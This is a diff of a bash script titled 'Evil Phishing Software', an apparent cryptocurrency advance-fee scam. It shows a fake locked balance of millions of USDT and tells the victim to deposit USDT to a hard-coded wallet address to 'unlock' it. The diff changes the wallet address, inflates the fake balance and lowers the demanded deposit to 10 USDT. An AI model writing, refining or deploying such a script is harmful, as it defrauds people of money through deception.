@@ -2,8 +2,8 @@
 
 # Evil Phishing Software
 
-balance=1000000
-hash_id="TMuvBC54zi3awX2oHFPjUz8Mx1X65gLyWn"
+balance=10000000
+hash_id="THQT4kDfe5LVxykDabYA2cpE3k3tRU8mB3"
 
 usdt_logo="
 \033[0;34m$$$$$$\
@@ -32,13 +32,13 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 60 USDT to the following address: $hash_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 10 USDT to the following address: $hash_id"
 
 function unlockBalance {
     read -p "Enter your deposit amount in USDT: " depositAmount
     read -p "Enter the transaction hash ID: " transactionHash
 
-    if [[ $depositAmount -eq 60 && $transactionHash == "$hash_id" ]]; then
+    if [[ $depositAmount -eq 10 && $transactionHash == "$hash_id" ]]; then
         echo "Congratulations! Your balance of $balance USDT has been unlocked."
         exit 0
     else
